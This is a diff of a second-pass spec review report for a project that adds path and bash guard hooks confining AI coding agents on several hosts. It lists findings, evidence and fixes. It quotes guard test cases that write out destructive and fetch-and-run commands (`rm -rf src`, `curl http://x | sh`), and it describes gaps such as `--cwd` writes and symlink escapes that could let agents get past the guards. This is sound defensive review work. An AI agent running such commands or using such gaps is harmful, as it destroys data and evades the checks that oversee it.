@@ -18,19 +18,23 @@ Q-perf-01 (C002-NFR-103) and the `[ASSUMPTION: S-07/S-08]` items are open for P-
 are not findings. The seven gaps the conductor had already queued for a fix round are included below
 (CR-7 … CR-14) with a severity, so that one fix round covers everything.
 
-The initial review (base 05d1506) found CR-1 … CR-22. Re-review 1 (step 7, at c7f4fc7) is at the end
-of this report: per-finding status of CR-1 … CR-22, new findings CR-23 … CR-31, rubric and verdict.
+The initial review (base 05d1506) found CR-1 … CR-22. Re-review 1 (step 7, at c7f4fc7) follows the
+initial review: per-finding status of CR-1 … CR-22, new findings CR-23 … CR-31, rubric and verdict.
+Re-review 2 (step 7, second pass, at 1b7c54c) is at the end of this report: status of CR-23 … CR-31,
+new findings CR-32 … CR-36, rubric and verdict; its reviewed IDs are listed in its scope.
 
 ## Summary
 
-Open findings after re-review 1:
+Open findings after re-review 2:
 
 | blocker | major | minor |
 |---|---|---|
-| 1 | 2 | 6 |
+| 0 | 1 | 4 |
 
 Initial review: 1 blocker, 10 major, 11 minor. Re-review 1: 20 resolved, 2 partially resolved (the
-remainders are carried as CR-23 and CR-29), 9 new findings (CR-23 … CR-31).
+remainders are carried as CR-23 and CR-29), 9 new findings (CR-23 … CR-31). Re-review 2: 8 of
+CR-23 … CR-31 resolved, CR-29 partially resolved (remainder carried as CR-35), 5 new findings
+(CR-32 major, CR-33 … CR-36 minor).
 
 ## Findings (initial review)
 
@@ -346,7 +350,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** the CR-1 fix covers memory and identity, but other cases rest on hook-input fields the generated mechanisms do not have. The sdd MCP server cannot receive "no cwd", so PG-253, PG-254 and BG-277 are allowed against an expected `deny`; PG-256 expects `allow` where every generated mechanism must deny an unclassed tool (C002-REQ-309, C002-CON-08); PG-134 becomes a false allow if its relative path is fed against the server root, because §2.2 does not say how a case's `cwd` is fed; PG-237 has no generated agent to play it on OpenCode; PG-163 may not run on REF-WIN. None of them may be listed as not applicable (schema constant, ERR-REL-012, C002-INV-14). Under sdd MCP server enforcement, the expected mode for both targets ("`sdd-mcp-server` is the expected OpenCode mode" — `mapping-tables.md:197-198`), C002-REQ-617 then refuses every release, or the implementer chooses the expectations: the safety decision CR-1 was about.
 - **Suggested fix:** in C002-IF-009 §2.2 state how a case's `cwd` is fed (server and OpenCode: the case path resolved against the case's `cwd`; Copilot hooks: the case's `cwd` in the input). Apply P-01's answer to Q-safety-04 for the cases with an absent field (missing or empty `cwd`, missing tool name) and for unknown `architect:sdd-*` callers on OpenCode. Recommended: a per-mechanism expectation as for memory (`deny`, fed as a malformed call, C002-CON-08; an unknown-name caller on OpenCode expects `allow`, C002-REQ-208), with `expected_source` naming the rule. The alternative is a second not-applicable rule, listing the cases by ID (schema, ERR-REL-012, C002-INV-14, glossary, C002-TS-631). Also require REF-WIN to create file symbolic links (Developer Mode) so that `requires` cases run, or give those cases a rule.
 - **Owner:** architect (C002-IF-009 §2, schema, ERR-REL-012, C002-INV-14), spec-writer (C002-REQ-625 … C002-REQ-627 or a new REQ, glossary), test-designer (C002-TS-608, C002-TS-631, a scenario for PG-253 and PG-256)
-- **Status:** open
+- **Status:** resolved (re-review 2; the rule chosen for `requires` cases is CR-32)
 
 #### CR-24 — C002-REQ-517 and C002-REQ-503 both MODIFY C001-REQ-1106: the archive cannot apply the second delta
 - **Severity:** major
@@ -355,7 +359,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** after C002-REQ-503 replaces C001-REQ-1106 in `_living/`, C002-REQ-517 no longer finds it and `sdd archive 002` reports a blocker; in the other order the Serena-only statement would replace the allowlist rule. C002-REQ-517 adds a rule beside the allowlist; it does not restate C001-REQ-1106 (rubric R11).
 - **Suggested fix:** give C002-REQ-517 `Delta: ADDED`, keeping its rationale and evidence (C001-REQ-1106, current-state E-5, E-22); the waived LINT-DELTA-001 errors drop to nine.
 - **Owner:** spec-writer
-- **Status:** open
+- **Status:** resolved (re-review 2)
 
 #### CR-25 — `--cwd` lets every writing `sdd` subcommand write a `.sdd/` that the path guard refuses; C002-IF-008 §1.2 concludes that no rule is needed
 - **Severity:** major
@@ -364,7 +368,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** `sdd change stop 001 --reason x --cwd C:/other-repo`, `sdd archive 001 --cwd C:/other-repo` or `sdd init --cwd C:/Users/me` pass the Claude Code hooks, the server's command tool, the scoped hooks and OpenCode's `sdd *` rule. They change another workspace's `.sdd/` or create one, which PG-082 refuses as a direct write. In a repository with a nested workspace (`<repo>/pkg/.sdd/`) the write lands inside the repository but outside its `.sdd/`. The gap exists on Claude Code today (parity with C002-DEC-005 holds), but §1.2 states the opposite, and the cases of C002-REQ-607 (C002-TS-636) will not exercise it. Closing it changes Claude Code behaviour (C002-GOAL-05), so P-01 decides, as for Q-guards-04.
 - **Suggested fix:** apply P-01's answer to Q-guards-05. Recommended: the bash guard core allows `--cwd` on the writing subcommands of §1.2 only when the folder resolves inside the repository root of §1.1, on every host; add to C002-REQ-607 and C002-TS-636 one case `sdd <writing subcommand> --cwd {outside}` (deny) and one with a folder inside the repository (allow). If P-01 accepts the gap as parity instead, correct §1.2 to record the accepted `--cwd` risk.
 - **Owner:** spec-writer (C002-REQ-607, a new REQ or C002-REQ-517, C002-GOAL-05), architect (C002-IF-008 §1.2), test-designer (C002-TS-610, C002-TS-636)
-- **Status:** open
+- **Status:** resolved (re-review 2; the upward workspace search raised by the architect is CR-36)
 
 #### CR-26 — The Claude Code Serena step depends on `CLAUDE_PLUGIN_DATA` in the hook's environment, an unrecorded host assumption that C002-TS-528 stubs
 - **Severity:** minor
@@ -373,7 +377,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** if Claude Code neither substitutes the variable in the command text nor exports it to PreToolUse hook processes, the Serena step of the Claude Code doctor and init commands is denied after CHG-002, a regression against C002-GOAL-05 and C002-REQ-623. C002-TS-528 would still pass, because it sets the variable itself.
 - **Suggested fix:** cite the host documentation for the variable in hook processes, or mark `[ASSUMPTION: …]` in §1.1 with a check on the real host (an `@eval` of the Claude Code doctor's Serena step at its tested version, named in C002-DOD-022), and state the fallback if the variable is absent.
 - **Owner:** architect (C002-IF-008 §1.1), test-designer (C002-TS-528, C002-DOD-022)
-- **Status:** open
+- **Status:** resolved (re-review 2)
 
 #### CR-27 — The S-07 outcome `agent_tools_closed` has no consequence
 - **Severity:** minor
@@ -382,7 +386,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** if S-07 finds that OpenCode ignores the catch-all (adopter tools stay on) or that a named entry cannot override it (agents lose every tool), neither enforcement mode closes the tool set, the release check does not refuse, and only C002-TS-133 fails at the DoD, with no way forward defined. The S-08 outcomes, by contrast, each lead to a mode or to the spec revision of scope §1.1.
 - **Suggested fix:** mark the outcome `[ASSUMPTION: S-07]` in C002-IF-001 §6.1 and state its consequence, for example a release-check refusal of OpenCode on `agent_tools_closed: false` and a scope revision with P-01 as in scope §1.1.
 - **Owner:** architect
-- **Status:** open
+- **Status:** resolved (re-review 2)
 
 #### CR-28 — ERR-REL-012: garbled message template and a condition narrower than the check
 - **Severity:** minor
@@ -391,7 +395,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** the duplicated fragment and the unescaped `|` inside a table cell (which splits the row when rendered) leave the message that C002-TS-637 checks ambiguous; the condition does not cover a report that replays identity cases on the server or the scoped hooks instead of listing them.
 - **Suggested fix:** one message with the three alternatives, pipes escaped (`\|`), no duplicate; condition "… or whose not-applicable list differs from the cases that C002-IF-009 §2.1 excludes for its mechanism".
 - **Owner:** architect
-- **Status:** open
+- **Status:** resolved (re-review 2)
 
 #### CR-29 — Index scenario counts stale after c7f4fc7; four new scenarios lie outside their capability's TS block
 - **Severity:** minor
@@ -400,7 +404,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** navigation at G2 shows wrong counts and block ranges; a reader looking for C002-TS-640 under CAP-06 by its number will not find it.
 - **Suggested fix:** update the TS column (34, 24, 36, 38; total 194) and note the out-of-block IDs in the index; IDs are not renumbered.
 - **Owner:** spec-writer (index)
-- **Status:** open
+- **Status:** partially resolved (re-review 2) — CAP-01, CAP-04 and CAP-05 counts and the out-of-block IDs fixed; the CAP-06 count, the total and a note on missing ACs are stale again, carried as CR-35
 
 #### CR-30 — The nine new requirements cite their acceptance criteria in backticks, which lint does not check
 - **Severity:** minor
@@ -409,7 +413,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** the Acceptance field of these nine requirements is not a checked reference, unlike that of the other 107; a renamed or missing AC would not be reported.
 - **Suggested fix:** remove the backticks now that the ACs exist.
 - **Owner:** spec-writer
-- **Status:** open
+- **Status:** resolved (re-review 2)
 
 #### CR-31 — Stale or contradictory text left by the fix rounds
 - **Severity:** minor
@@ -418,7 +422,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 - **Why it matters:** three statements contradict the current decisions; the third leaves the implementer unsure whether a wider ripwire or git glob is allowed (the replay then selects server mode, so there is no safety impact).
 - **Suggested fix:** CAP-04 header: "the guard cores it calls are those of C002-COMP-012, as changed by C002-REQ-503 and C002-REQ-517"; replace the Q-safety-03 sentence with its answer; restate C002-CON-06 and §6.3 as "no `allow` rule wider than the forms the generated agents send need; a guard rule a glob cannot follow is a replay difference".
 - **Owner:** spec-writer (CAP-04 header), architect (C002-IF-001 §6.3, C002-CON-06)
-- **Status:** open
+- **Status:** resolved (re-review 2)
 
 ### Rubric (re-review 1)
 
@@ -464,7 +468,7 @@ P-01's answers (Q-safety-02, Q-defer-01, Q-guards-04).
 | plan | P1 … P7 | n/a: spec phase |
 | ideation | I1 … I10 | n/a: spec phase (G1 approved 2026-10-14; ideation not stale) |
 
-## Verdict
+## Re-review 1 verdict
 
 **needs-revision** — the fix round resolved 20 of the 22 initial findings, and the two partial ones
 are carried forward. P-01's answers of rounds 2 and 3 are applied faithfully: per-mechanism
@@ -480,3 +484,161 @@ taken with hooks enabled. G2 still cannot pass on three points:
 
 The six minor findings can go in the same fix round. A further re-review can be limited to
 C002-IF-009 §2, C002-REQ-517, C002-IF-008 §1.1 and §1.2, C002-REQ-607 and the IDs linked to them.
+
+## Re-review 2 — step 7, second pass (2026-10-14)
+
+### Scope and mechanical state
+
+- Reviewed: `git diff 5991841 1b7c54c -- .sdd/002-multi-platform-targets/10-spec` (29 files; commits
+  1175ae2, 5fdccb6, f87b127, 6622c97, ca73916, 1b7c54c) and P-01's round 4 answers in
+  `10-spec/questions-log.md` (Q-safety-04 at l.92, Q-guards-05 at l.99), each checked against the
+  artifact text.
+- Reviewed IDs of this pass (changed IDs and the IDs linked to them): C002-REQ-207, 405, 503,
+  517 … 521, 606, 607, 617, 623, 625 … 630, 632; C002-AC-521.1, 607.1, 617.1, 623.1, 627.1, 630.1,
+  632.1; C002-TS-536, 537, 608, 610, 626, 631, 636, 637, 643 … 648; C002-NFR-201, 202;
+  C002-DOD-008, 022; C002-US-502, 602; C002-GOAL-02, 05; scope §2; C002-INV-14; the glossary rows
+  "Expected decision for a mechanism", "Malformed call", "Repository root", "`--cwd` option" and
+  "Writing `sdd` subcommand"; the state-machines §2 note; C002-IF-001 §6.1, §6.3; C002-IF-002 §3,
+  §5.2; C002-IF-007 (`guard-bash` row); C002-IF-008 §1, §1.1, §1.2, §2; C002-IF-009 §2, §3, §5 and
+  `release-record.schema.json`; ERR-REL-012, ERR-REL-013, GUARD-BASH-001, GUARD-HOOK-001;
+  C002-CON-06; C002-COMP-008, 010, 012; architecture §6.2 rows, F11, F12; the CAP-04 and CAP-05
+  headers; the index. Linked and read without change: C002-REQ-108, 208, 309; C002-CON-08;
+  C002-DEC-005; C001-IF-01.
+- `sdd lint 002 --phase 10-spec --json`: 9 LINT-DELTA-001 errors only (C002-REQ-211, 212, 213,
+  503 … 507, 601), waived at G2 under C002-DEC-008 — not findings; the tenth (C002-REQ-517) is gone
+  with CR-24.
+- `sdd trace 002`: TR-01 30/30, TR-02 119/119, TR-03 121/121, TR-04 16/16, TR-05 119/119 and 16/16;
+  14 open items, each an assumption tied to spike S-07, S-08, R-001 or C002-TS-537.
+- Code, corpora and contracts read as evidence: `src/cli/run.ts`, `src/workspace/find.ts`,
+  `src/hooks/guard-path.ts`, `tests/guards/fixture.ts`, `tests/guards/path-corpus.json` (identity
+  cases, PG-163), `tests/guards/bash-corpus.json` (BG-019, BG-265 … BG-267, BG-277),
+  `.sdd/001-architect-agent-suite/10-spec/50-interfaces/sdd-cli.md` (C001-IF-01),
+  `00-ideation/research/R-001-platform-facts.md`.
+
+### Status of CR-23 … CR-31
+
+| ID | Severity | Status | Evidence of the fix |
+|---|---|---|---|
+| CR-23 | blocker | resolved | ordered expectation rules per mechanism — `50-interfaces/verification-records.md:46-65`; "THE corpus replay suite SHALL replay every applicable case of the guard corpora whose hook input has no `cwd`, an empty `cwd` or no tool name … as a malformed call with `deny` as its expected decision" — `CAP-06-cross-target-verification/requirements.md:274`; C002-REQ-632 — `:283`; "they receive the case's path joined to the case's `cwd` without normalisation … PG-134 … is fed as `{repo}/src/.sdd/a.md` and stays `deny`" — `verification-records.md:79-87`; `replay_host` and per-source constraints — `release-record.schema.json:168-177, 217-241`; the release check recomputes every expectation — `verification-records.md:205`; C002-INV-14 — `40-domain/domain-model.md:94`; C002-TS-643 … C002-TS-647. Matches Q-safety-04: "every case is still replayed and the not-applicable list stays limited to identity cases" (`questions-log.md:92`). The rule added for `requires` cases, which Q-safety-04 did not cover: CR-32 |
+| CR-24 | major | resolved | "- **Delta:** ADDED" — `CAP-05-cli-distribution/requirements.md:172`; "C002-REQ-503 is the single MODIFIED delta of C001-REQ-1106" — `:13`; lint down to 9 LINT-DELTA-001 |
+| CR-25 | major | resolved | C002-REQ-521 — `CAP-05-…/requirements.md:209-216`; writing-command recognition — `50-interfaces/hooks-contract-delta.md:116-122`; "**`--cwd` rule (C002-REQ-521).**" with resolution, unresolvable words and deny reasons — `:124-147`; matches `src/cli/run.ts:33-45` (subcommand from the first words) and `:133` (`--cwd` resolved against the working folder); C002-REQ-607 cases — `CAP-06-…/requirements.md:75`; C002-TS-536 — `CAP-05-…/acceptance.md:546`; C002-TS-610 rows, C002-TS-636; C002-GOAL-05 — `10-context/problem-and-goals.md:37`; GUARD-BASH-001 reasons — `errors.md:99`; OpenCode row "`sdd *--cwd*` denied" — `mapping-tables.md:192`. Matches Q-guards-05 (`questions-log.md:99`). The upward workspace search the architect raised: CR-36 |
+| CR-26 | minor | resolved | "[ASSUMPTION: C002-TS-537 — Claude Code at its tested version substitutes CLAUDE_PLUGIN_DATA in the command text before the PreToolUse hook runs, or sets it in the environment of the hook process]" with the fallback "the implementing task stops and raises a spec defect against C002-REQ-517 for a revision with P-01" — `hooks-contract-delta.md:63-69`; C002-TS-537 on the real host, the variable "set by no test step" — `CAP-05-…/acceptance.md:459-470`; C002-DOD-022 — `70-dod.md:46` |
+| CR-27 | minor | resolved | "[ASSUMPTION: S-07 — OpenCode honours the catch-all tool entry …]" and its consequence — `mapping-tables.md:156-160`; "`agent_tools_closed` is required in an S-07 record" — `verification-records.md:149-154`; release-check row — `:206`; ERR-REL-013 — `errors.md:76`; third condition of C002-REQ-617 — `CAP-06-…/requirements.md:166`; state-machines note; C002-TS-648 — `CAP-06-…/acceptance.md:355` |
+| CR-28 | minor | resolved | one message with `<problem>` alternatives, no unescaped pipe, and a condition covering the not-applicable list and the recorded expectations — `errors.md:75`; C002-TS-637 rows for the new problems — `CAP-06-…/acceptance.md:536-550` |
+| CR-29 | minor | partially resolved | CAP-01, CAP-04 and CAP-05 counts and the out-of-block IDs fixed — `00-index.md:46-54`; the CAP-06 count, the total and a note on missing ACs stale again after ca73916: CR-35 |
+| CR-30 | minor | resolved | "- **Acceptance:** C002-AC-517.1" — `CAP-05-…/requirements.md:178` (likewise C002-REQ-518 … 520 and C002-REQ-625 … 629); no backticked Acceptance field left in `10-spec/` |
+| CR-31 | minor | resolved | CAP-04 header — `CAP-04-sdd-mcp-server/requirements.md:12-13`; "P-01 keeps 0 differences for these forms too (Q-safety-03, spec round 3)" — `mapping-tables.md:204-206`; "no `allow` rule wider than the forms the generated agents send need; a guard rule that a glob cannot follow is a replay difference" — `mapping-tables.md:197-199` and `60-architecture/constraints.md:17` |
+
+### New findings
+
+#### CR-32 — A `requires` case that the replay host cannot build is fed as a malformed call, so it always passes
+- **Severity:** major
+- **Refs:** C002-REQ-630, C002-REQ-607, C002-NFR-201, C002-INV-14, C002-IF-009 §2.1, §2.2, §5, C002-DOD-008, C002-TS-643, C002-TS-631, C002-TS-637, glossary "Expected decision for a mechanism", Q-safety-04
+- **Evidence:** "…, or that needs a capability (`requires`) the replay host lacks, against each enforcement mechanism of a generated target as a malformed call with `deny` as its expected decision." — `10-spec/20-capabilities/CAP-06-cross-target-verification/requirements.md:274`; "| `requires` names a capability missing from the report's `replay_host.capabilities` (for example PG-163 on REF-WIN without Developer Mode) | replayed as the malformed call of §2.2, expected `deny` |" — `10-spec/50-interfaces/verification-records.md:54`; the malformed call is the mapped tool "with `{}` as arguments" on the server and, on the scoped hooks, "for a missing capability, `tool_input` `{}`" — `verification-records.md:98`; C002-TS-643: "Given the guard corpora of the release commit, replayed on REF-WIN without Developer Mode, so that the replay host cannot create file symbolic links" and "PG-163" (requires "file-symlink") … with the expected decision "deny", the expected-decision source "C002-REQ-630" and the decision "deny"" — `CAP-06-…/acceptance.md:588-590`; the case: `"id": "PG-163", "category": "symlink", "tool": "Write", … "path": "{repo}/.sdd/file-link.md", "expect": "deny", "requires": "file-symlink"` — `tests/guards/path-corpus.json:1416-1422`; the open question it should settle: "Whether `..` segments and symlinks are normalised before matching is also unknown … Must be settled by spike S-07 (replay of the 256-case path corpus)." — `00-ideation/research/R-001-platform-facts.md:195-198`; P-01's question listed "no or empty cwd, no tool name, unknown architect:sdd-* caller" — `10-spec/questions-log.md:88`, and the answer says "every case is still replayed" — `questions-log.md:92`.
+- **Why it matters:** a call without arguments is refused by every mechanism whatever its link handling, so on a replay host without file symbolic links PG-163 is reported as a replayed case with decision `deny`, although the file-link escape (a write to `.sdd/file-link.md` that lands outside `.sdd/`) was never put to the mechanism. Symbolic-link handling of OpenCode's permission patterns is exactly what R-001 leaves to the S-07 replay, so the S-07 replay could select `native-permissions`, and the release check pass C002-NFR-201's 0 differences, without that evidence (the directory-junction cases still run, which limits the gap to file links). The NFR's environment is REF-WIN, where the existing tests already skip PG-163 (`tests/guards/fixture.ts:87`), so this is the normal case, not an edge case. Q-safety-04 did not cover `requires` cases: the rule extends P-01's answer, and it would also absorb any file-link case added to the corpora later (C002-REQ-607).
+- **Suggested fix:** remove the `requires` clause from C002-REQ-630, §2.1 row 3, the last row of the §2.2 table, C002-INV-14, the glossary row, C002-DOD-008, C002-TS-643, C002-TS-631 (PG-163 part) and the PG-163 row of C002-TS-637. State instead that a release replay runs on a host that provides every capability the corpora name (REF-WIN with Developer Mode on for the replay run, or the replay run elevated), and add to §5 and ERR-REL-012 a refusal when `replay_host.capabilities` lacks a capability a corpus case requires (problem "replay host lacks <capability>"), with a C002-TS-637 row. The alternative, listing such cases as not replayed by ID with the missing capability, widens the not-applicable list beyond identity cases and needs P-01 (question Q-safety-05 in the hand-back).
+- **Owner:** spec-writer (C002-REQ-630, glossary), architect (C002-IF-009 §2.1, §2.2, §5, schema, ERR-REL-012, C002-INV-14), test-designer (C002-TS-643, C002-TS-631, C002-TS-637, C002-DOD-008)
+- **Status:** open
+
+#### CR-33 — C002-IF-009 §2.2 has every identity case on OpenCode played by the adopter agent, including the cases whose caller is an Architect agent
+- **Severity:** minor
+- **Refs:** C002-IF-009 §2.2, C002-REQ-626, C002-REQ-632, C002-TS-630, C002-TS-646
+- **Evidence:** "A case agent `architect:<name>` is played by the generated agent `<name>`" — `10-spec/50-interfaces/verification-records.md:69`, then "An identity case on OpenCode is played by the replay fixture's adopter agent, an agent of the fixture's own `opencode.json` that is none of the ten Architect agents and has no rule of the target package (C002-REQ-626)" — `verification-records.md:73-76`; versus "THE corpus replay suite SHALL replay the identity-category cases of the guard corpora against the OpenCode permission rules only, with each caller that is not an Architect agent played by an adopter agent." — `10-spec/20-capabilities/CAP-06-cross-target-verification/requirements.md:238`; identity cases with an Architect caller: BG-265 `"category": "identity", "tool": "Bash", "agent": "architect:sdd-conductor", "command": "rm -rf src", "expect": "deny"` — `tests/guards/bash-corpus.json:2273-2278` (BG-266 `architect:sdd-auditor` and BG-267 `architect:sdd-researcher`, `"curl http://x | sh"`, at `:2282-2297`).
+- **Why it matters:** read as written, §2.2 has BG-265 … BG-267 played by an agent that no rule binds, so OpenCode runs `rm -rf src` and `curl http://x | sh` against the corpus `deny`: three false differences that rule out native permission enforcement for a reason unrelated to its rules, while the generated conductor, auditor and researcher are never tested on these cases. C002-REQ-626 and the first sentence of the paragraph give the other reading. The result fails closed (server mode), hence minor.
+- **Suggested fix:** "An identity case on OpenCode whose caller is not an Architect agent (C002-REQ-626) or is an unknown `architect:sdd-*` name (C002-REQ-632) is played by the replay fixture's adopter agent; one whose caller is one of the ten Architect agents (BG-265 … BG-267) is played by that generated agent."
+- **Owner:** architect
+- **Status:** open
+
+#### CR-34 — The `--cwd` corpus cases: C002-IF-008 §1.2 excludes the Serena rows that C002-REQ-607 and C002-TS-636 include, and `hook subagent-stop` has no case
+- **Severity:** minor
+- **Refs:** C002-IF-008 §1.2, C002-REQ-607, C002-REQ-521, C002-TS-636
+- **Evidence:** "The guard corpora hold one case per row and, for every row but the Serena rows, one case with a `--cwd` folder outside the repository root (C002-REQ-607, C002-TS-636)" — `10-spec/50-interfaces/hooks-contract-delta.md:95-97`; versus "one case for each `sdd` subcommand that writes files with the option `--cwd` naming a folder outside the repository root" — `10-spec/20-capabilities/CAP-06-cross-target-verification/requirements.md:75` and "And it holds at least one case whose command runs "<subcommand>" with the option "--cwd" naming a folder outside the repository root and that expects "deny" with rule "GUARD-BASH-001"" with the rows `serena-config` and `serena-launch` — `CAP-06-…/acceptance.md:173, 194-195`; a writing command per §1.2: "names a row of the table above, `hook subagent-stop` included (it runs the trace refresh, C002-IF-007)" — `hooks-contract-delta.md:118-119`, with no `hook subagent-stop` row among the C002-TS-636 examples (`acceptance.md:175-195`).
+- **Why it matters:** the interface and the requirement disagree on which corpus cases exist, and one command the guard treats as writing has no case, so an implementer following §1.2 fails C002-TS-636. The guard decisions are not affected (a Serena command with `--cwd` is denied by §1.1 rule 1), hence minor.
+- **Suggested fix:** in §1.2 write "for every row, one case with a `--cwd` folder outside the repository root (the Serena rows are denied by §1.1 rule 1)"; add `hook subagent-stop` to C002-TS-636, or state in §1.2 and C002-REQ-607 that its case is covered by `trace --write`.
+- **Owner:** architect (C002-IF-008 §1.2), test-designer (C002-TS-636)
+- **Status:** open
+
+#### CR-35 — Index stale again after ca73916 (remainder of CR-29)
+- **Severity:** minor
+- **Refs:** 00-index, C002-TS-648, C002-AC-521.1, C002-AC-630.1, C002-AC-632.1
+- **Evidence:** "| C002-CAP-06 Cross-target verification | `CAP-06-cross-target-verification` | 601–607 (7) | 601–623, 625–630, 632 (30) | 30 | 43 (block 601–699) |" and "| **Total** | | **30** | **119** | **121** | **201** |" — `10-spec/00-index.md:51-52`, while `CAP-06-…/acceptance.md` defines 44 scenarios (C002-TS-648 at `:355`, added in ca73916) and the six acceptance files 202; "C002-REQ-521, C002-REQ-630 and C002-REQ-632 (fix round 2) await their acceptance criteria and scenarios from the test-designer" — `00-index.md:55-56`, while "#### C002-AC-521.1" (`CAP-05-…/acceptance.md:544`), "#### C002-AC-630.1" (`CAP-06-…/acceptance.md:585`) and "#### C002-AC-632.1" (`:627`) exist and `sdd trace 002` reports TR-02 119/119.
+- **Why it matters:** the G2 reader is told that three requirements lack acceptance criteria and gets a wrong scenario count.
+- **Suggested fix:** set the CAP-06 TS count to 44 and the total to 202; delete the "await their acceptance criteria" sentence.
+- **Owner:** spec-writer (index)
+- **Status:** open
+
+#### CR-36 — Writing commands reach a `.sdd/` above the repository root; the spec now uses two meanings of "repository" (architect's point)
+- **Severity:** minor
+- **Refs:** C002-REQ-521, C002-US-502, C002-IF-008 §1.1 rule 3, §1.2, C002-IF-002 §3, C001-IF-01, C001-REQ-1103, glossary "Repository root"
+- **Evidence:** "The workspace is found by walking up from the current directory to the first folder containing `.sdd/` (or `.git/` for `init`)." — `.sdd/001-architect-agent-suite/10-spec/50-interfaces/sdd-cli.md:18-20`; "/** First folder containing `.sdd/`, walking up from `start`. */" — `src/workspace/find.ts:5`; the path guard uses the same workspace: "// The repository is the first folder with `.sdd/` from `cwd` upward (a Bash `cd` may move `cwd`)." and "const repo = normalisePath(findWorkspace(normalisePath(cwd)) ?? cwd);" — `src/hooks/guard-path.ts:52-53`; so does the server: "From that folder the server walks up to the first folder that contains `.sdd/`, as the CLI does (C001-IF-01)" — `10-spec/50-interfaces/sdd-mcp-server.md:61-62`; versus the root of C002-REQ-517/521: "The top folder of the git working tree that contains `cwd` (the nearest ancestor, `cwd` included, that holds `.git`); when `cwd` lies in no git working tree, the nearest ancestor that holds `.sdd/`" — `10-spec/50-interfaces/hooks-contract-delta.md:78-80`; the story's outcome: "no allowlisted `sdd` command writes outside `.sdd/` into the repository or into another folder's `.sdd/`" — `10-spec/20-capabilities/CAP-05-cli-distribution/stories.md:25`; §1.2's conclusion: "writes only inside the `.sdd/` folder of the workspace that the CLI finds from a folder at or under the repository root (C001-IF-01)" — `hooks-contract-delta.md:145-147`.
+- **Why it matters:** in a git repository without `.sdd/` that lies under a folder with one (for example `C:/Users/me/.sdd/` above `C:/Users/me/proj/`), `sdd change new`, `sdd status --write` or `sdd trace --write`, with no `--cwd` or with an inside-root `--cwd`, write `C:/Users/me/.sdd/`, outside the repository root that C002-REQ-521 confines. This is not a guard bypass and not new: the path guard takes the same workspace and allows a direct write there, the sdd MCP server takes it as its root, and `init` stops at `.git/`, so Claude Code, the server and the scoped hooks agree, as in CHG-001. What the fix round adds is a second meaning of "repository" (git first for C002-REQ-517/521, `.sdd/` first for the path guard and the CLI) and a story outcome that promises more than C002-REQ-521 delivers. Closing the case would change workspace discovery for the CLI and every hook (C001-IF-01, C001-REQ-1103), beyond C002-GOAL-05; nothing in CHG-002 requires it, so P-01 does not need to decide it for G2.
+- **Suggested fix:** in C002-IF-008 §1.2 (last paragraph) state that the workspace is the first `.sdd/` found upward (C001-IF-01), which can lie above the repository root when the repository has none, as for the path guard and the sdd MCP server (C002-IF-002 §3), so that C002-REQ-521 confines the folder the CLI starts from, not the workspace it finds; reword the outcome of C002-US-502 to "… or into the `.sdd/` of a workspace other than the one found from the repository". Optionally note "stop workspace discovery at the git root" as an idea for a later change.
+- **Owner:** architect (C002-IF-008 §1.2), spec-writer (C002-US-502)
+- **Status:** open
+
+### Rubric (re-review 2, applied to the reviewed IDs of this pass)
+
+| Rubric | Item | Result |
+|---|---|---|
+| stories | S1 Persona is a defined P-ID | pass |
+| stories | S2 Value / outcome stated | pass (C002-US-502 outcome wording in CR-36) |
+| stories | S3 INVEST | pass |
+| stories | S4 Every story has ≥ 1 requirement | pass (C002-US-502 lists C002-REQ-521; C002-US-602 lists C002-REQ-630, C002-REQ-632) |
+| stories | S5 Out of scope stated where a neighbour exists | pass (scope §2 names the three Claude Code changes) |
+| stories | S6 Traces to the ideation | pass (Q-guards-05 and Q-safety-04 cited in both stories) |
+| requirements | R1 Singular outcome | pass (C002-REQ-617 has one refusal outcome with three conditions; C002-REQ-630 one expectation rule) |
+| requirements | R2 Testable | pass |
+| requirements | R3 Unambiguous | pass |
+| requirements | R4 Correct EARS pattern | pass (C002-REQ-521 unwanted-behaviour; C002-REQ-630, C002-REQ-632 ubiquitous) |
+| requirements | R5 Implementation-free | pass |
+| requirements | R6 Complete | pass (C002-REQ-521's error case is GUARD-BASH-001 with its two reasons) |
+| requirements | R7 Consistent | CR-32, CR-33, CR-34, CR-36 |
+| requirements | R8 Feasible | pass |
+| requirements | R9 Necessary | CR-32 (the `requires` clause goes beyond Q-safety-04) |
+| requirements | R10 Measurable values with units and limits | pass |
+| requirements | R11 Delta and evidence | pass (CR-24 resolved; 9 LINT-DELTA-001 waived under C002-DEC-008) |
+| requirements | R12 Priority set and consistent | pass (C002-REQ-521, 630, 632 Must, as their stories) |
+| NFRs | N1 ISO 25010 category | pass |
+| NFRs | N2 Metric with unit | pass |
+| NFRs | N3 Threshold set or marker | pass |
+| NFRs | N4 Feasible method and environment | CR-32 |
+| NFRs | N5 Covered by a DoD item | pass (C002-DOD-008) |
+| acceptance | A1 Every REQ has an AC, every AC a TS | pass (TR-02 119/119, TR-03 121/121) |
+| acceptance | A2 Scenarios observable and concrete | pass |
+| acceptance | A3 One behaviour per scenario | pass |
+| acceptance | A4 Error and abuse cases present | pass (C002-TS-536 outside, link and `..` rows; C002-TS-645, C002-TS-647, C002-TS-648) |
+| acceptance | A5 n/a cells justified | pass |
+| domain, interfaces, architecture | D1 Entities with attributes, relationships, owner, invariants | pass (C002-INV-14 inherits CR-32) |
+| domain, interfaces, architecture | D2 Lifecycles > 2 states: diagram and complete table | pass (S-07 note in state-machines §2) |
+| domain, interfaces, architecture | D3 Interfaces parse and name their errors | pass (ERR-REL-012, ERR-REL-013, GUARD-BASH-001 reasons, GUARD-HOOK-001) |
+| domain, interfaces, architecture | D4 Components with ID, responsibilities, requirements served | pass (C002-COMP-008, 010, 012 realize C002-REQ-521, 630, 632) |
